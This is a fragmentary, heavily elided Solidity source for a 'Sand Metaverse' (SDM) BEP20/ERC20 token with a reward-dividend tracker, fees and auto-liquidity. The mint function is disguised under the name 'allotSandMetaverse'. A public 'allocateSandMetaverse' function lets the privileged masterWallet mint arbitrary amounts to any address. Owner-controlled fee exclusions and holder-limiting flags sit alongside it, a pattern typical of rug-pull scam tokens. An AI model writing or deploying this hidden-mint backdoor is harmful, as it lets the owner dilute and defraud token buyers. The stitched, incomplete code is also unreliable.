...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function allotSandMetaverse(address account, uint256 amount) internal virtual {
...
function allotSandMetaverse(address account, uint256 value) internal override {
    super.allotSandMetaverse(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      allotSandMetaverse(account, mintAmount);
...
library RewardSandMetaverseMap  {
...
contract SandMetaverserewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardSandMetaverseMap  for RewardSandMetaverseMap .Map;
RewardSandMetaverseMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("SandMetaverse_rewardToken_Tracker", "SandMetaverse_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "SandMetaverse_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "SandMetaverse_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SandMetaverse contract.");
    }
...
contract SandMetaverse is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    SandMetaverserewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Sand Metaverse", "SDM") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new SandMetaverserewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 allotSandMetaverse(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function allocateSandMetaverse(address tokenAddress, uint256 tokenePercent) public masterWallet{
       allotSandMetaverse(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "SandMetaverse: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "SandMetaverse: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "SandMetaverse: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SandMetaverse: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTSandMetaverse = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTSandMetaverse);
...
addLiquidity(tokensTSandMetaverse, bnbForLiquidity);
